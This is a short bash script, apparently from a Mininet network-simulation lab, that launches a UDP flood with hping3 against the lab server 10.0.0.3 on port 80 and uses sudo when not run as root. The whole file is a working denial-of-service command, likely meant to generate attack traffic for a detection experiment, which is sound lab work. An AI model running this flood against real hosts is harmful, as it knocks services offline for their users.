#!/bin/bash
echo "🚨 LAUNCHING UDP FLOOD ATTACK to h3 (Server: 10.0.0.3) 🚨"
echo "Press Ctrl+C to stop the attack."
trap "echo 'Stopping attack...'; exit 0" SIGINT SIGTERM

# Run inside Mininet host h2 namespace (e.g., in xterm h2 or 'mininet> h2 bash network/attack_traffic.sh')
if [ "$EUID" -ne 0 ]; then
    sudo hping3 --flood --udp -p 80 10.0.0.3
else
    hping3 --flood --udp -p 80 10.0.0.3
fi
